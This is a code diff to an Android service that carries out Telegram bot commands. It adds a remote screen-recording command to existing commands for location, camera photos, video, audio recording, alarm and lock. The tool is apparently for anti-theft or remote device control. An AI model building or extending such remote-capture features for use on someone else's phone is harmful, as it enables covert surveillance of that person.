@@ -158,6 +158,21 @@ class BotCommandListener : Service() {
             return
         }
 
+        // /screenrecord alohida — duration parametr oladi (/screenrecord 30)
+        if (cmd.startsWith("/screenrecord") || cmd.startsWith("/screen")) {
+            val parts       = cmd.split("\\s+".toRegex())
+            val durationSec = parts.getOrNull(1)?.toIntOrNull()?.coerceIn(5, 60) ?: 20
+            val permIntent  = Intent(this, ScreenRecordPermissionActivity::class.java).apply {
+                putExtra(ScreenRecordService.EXTRA_DURATION_SEC, durationSec)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            startActivity(permIntent)
+            TelegramSender.sendMessage(token, chatId,
+                "🖥️ Ekran yozuvi so'ralmoqda ($durationSec soniya)...\n" +
+                "⚠️ Qurilmada tizim dialogi chiqadi — birinchi marta \"Hozir boshlash\"ni bosish kerak bo'ladi (Android talabi).")
+            return
+        }
+
         when (cmd) {
             "/alarm", "/signal" -> {
                 startForegroundService(Intent(this, AlarmService::class.java))
@@ -187,6 +202,7 @@ class BotCommandListener : Service() {
                     /location — faqat joylashuv
                     /photo — surat ol (old + orqa)
                     /video [soniya] — video yoz (masalan: /video 30, default 15s)
+                    /screenrecord [soniya] — ekranni yoz (masalan: /screenrecord 30, default 20s)
                     /audio — ovoz yozish
                     /alarm — jiringlatish
                     /lock — ekranni darhol qulflash
